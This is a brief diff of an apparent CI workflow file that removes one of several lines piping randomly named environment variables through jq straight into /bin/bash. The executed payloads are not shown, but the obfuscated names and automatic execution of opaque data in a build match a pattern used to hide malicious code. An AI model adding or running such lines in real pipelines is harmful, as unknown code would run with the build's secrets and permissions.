@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$kr29" | jq -r .cvgrz75 | /bin/bash
           echo $okf6 | jq -r .tku3362 | /bin/bash
-          printf '%s' "$zyjh80" | jq -r .pyrkx94 | /bin/bash
           echo $mvf53400 | jq -r .ql6266 | /bin/bash
 
       - name: Archive results
